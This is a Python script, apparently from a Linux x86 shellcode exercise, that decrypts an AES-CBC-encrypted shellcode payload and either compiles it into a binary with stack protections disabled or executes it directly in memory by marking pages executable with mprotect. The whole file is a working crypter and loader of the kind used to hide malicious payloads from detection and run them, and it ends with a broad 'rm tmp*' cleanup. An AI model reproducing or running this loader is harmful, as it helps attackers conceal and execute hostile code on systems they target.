#!/usr/bin/python3
from Crypto.Cipher import AES
import os
import sys
import argparse
from ctypes import *

def decrypt(key, shellcode):
	# Obtain iv from first 16 bytes of ciphertext
	iv = shellcode[0:16].decode('utf-8')

	# Set up AES for decryption routine
	aes = AES.new(key, AES.MODE_CBC, iv)

	cipher = ""
	for i in bytearray(shellcode):
		cipher += '\\x%02x' % i

	# Decrypt shellcode
	plain = aes.decrypt(bytes(shellcode))

	try:
		plaintext = plain[16:].decode('utf-8')
	except:
		print('\n[-] Incorrect decryption key provided. Exiting.')
		sys.exit(1)

	return plaintext

def compile_sc(shellcode):
	print('\n[*] Compiling shellcode runner...')
	shellcode_file = open("shellcode.c", "rt")
	data = shellcode_file.read()
	data = data.replace("SHELLCODE", shellcode)

	shellcode_file.close()
	shellcode_file = open("tmp.c", "wt")
	shellcode_file.write(data)
	shellcode_file.close()
	
	os.system('gcc -fno-stack-protector -z execstack tmp.c -o shellcode')

	print('\n[+] Shellcode compiled. Execute ./shellcode to run') 

def run_sc(shellcode_decrypted):
	print('\n[*] Executing decrypted shellcode in memory...')
	# Do all the memory allocation stuff
	shellcode_decrypted = shellcode_decrypted.replace('\\x', '')
	shellcode_decrypted = bytes.fromhex(shellcode_decrypted)

	shellcode = create_string_buffer(shellcode_decrypted)
	run = cast(shellcode, CFUNCTYPE(None))

	libc = CDLL('libc.so.6')
	pagesize = libc.getpagesize()
	address = cast(run, c_void_p).value
	address_page = (address // pagesize) * pagesize

	for page_start in range(address_page, address+len(shellcode_decrypted), pagesize):
		assert libc.mprotect(page_start, pagesize, 0x7) == 0
	run()


def cleanup():
	# Remove any files created following compilation
	print('\n[*] Performing cleanup!')
	os.system('rm tmp*')

def main():
	# Process arguments
	parser = argparse.ArgumentParser(description='Custom Linux x86 shellcode decrypter using AES-CBC')
	action_choices = ['compile', 'run']
	parser.add_argument('-k', '--key', type=str, help='16-byte decryption key to decrypt the shellcode payload')
	parser.add_argument('-p', '--payload', type=str, help='Shellcode payload to decrypt')
	parser.add_argument('-a', '--action', type=str, help='Choose to compile or execute the decrypted shellcode in memory', choices=action_choices)
	parser.add_argument('-s', '--shellcode', help='Output shellcode only', action='store_true')
	args = parser.parse_args()
	
	if len(sys.argv) == 1:
                parser.print_help()
                sys.exit()

	# Convert encrypted string shellcode into byte array
	shellcode = args.payload
	shellcode = shellcode.replace('\\x', '')
	shellcode = bytes.fromhex(shellcode)
	
	# Decrypt and print the shellcode
	decrypted = decrypt(args.key, shellcode)
	print('\n[+] Decrypted Shellcode: "%s"\n' % decrypted)	

	# Based on command-line arguments, either compile the shellcode
	# Into an executable, or run it in memory
	if args.action == 'compile':
		compile_sc(decrypted)
	elif args.action == 'run':
		run_sc(decrypted)
	
	# Perform cleanup of leftover files
	cleanup()
	print('\n[*] Exiting.')
	
if __name__ == "__main__":
	main()
